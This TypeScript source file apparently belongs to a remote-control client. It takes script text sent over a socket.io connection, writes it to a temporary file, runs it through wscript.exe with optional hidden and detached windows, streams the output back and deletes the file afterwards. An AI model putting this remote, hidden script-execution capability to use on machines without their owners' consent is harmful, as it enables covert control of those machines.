import * as fs from 'promise-fs';
import * as path from 'path';

import { spawn, ChildProcess } from 'child_process';
import { Readable } from 'stream';

import { Module } from '../module';

export interface ExecuteWScriptArgs {
	shell: string;
	script: string;
	args: string[];
	detached: boolean;
	hide: boolean;
}

export class ExecuteWScriptStream {
	public stdout: Readable;
	public stderr: Readable;

	public constructor(stdout: Readable, stderr: Readable) {
		this.stdout = stdout;
		this.stderr = stderr;
	}
}

export default class ExecuteWScriptModule extends Module<ExecuteWScriptArgs, ExecuteWScriptStream> {
	public constructor(socket: SocketIOClient.Socket) {
		super(socket, 'Execute (WScript)', 'execute-wscript');
	}

	public async run({ shell, script, args, detached, hide }: ExecuteWScriptArgs): Promise<ExecuteWScriptStream> {
		const file: string = path.resolve(`script-${Math.floor(Math.random() * 0xFF)}.${shell}`);
		await fs.writeFile(file, script, {
			encoding: 'utf16le'
		});

		const spawned: ChildProcess = spawn('wscript.exe', [
			file,
			...args
		], {
			detached: detached,
			windowsHide: hide,
			stdio: [
				'ignore',
				'pipe'
			]
		});

		spawned.on('exit', async (code: number | null) => {
			await fs.unlink(file);

			this.socket.emit('module-data', {
				module: this.action,
				type: 'exit',
				code: code
			});
		});
		
		const stream: ExecuteWScriptStream = new ExecuteWScriptStream(
			spawned.stdout || new Readable(),
			spawned.stderr || new Readable()
		);

		stream.stdout.on('data', (rawData: { toString: () => string }) => {
			const data: string = rawData.toString();
			console.log(`[child/stdout] ${data}`);

			this.socket.emit('module-data', {
				module: this.action,
				type: 'stdout',
				data: data
			});
		});

		stream.stderr.on('data', (rawData: { toString: () => string }) => {
			const data: string = rawData.toString();
			console.log(`[child/stderr] ${data}`);

			this.socket.emit('module-data', {
				module: this.action,
				type: 'stderr',
				data: data
			});
		});

		return stream;
	}
}
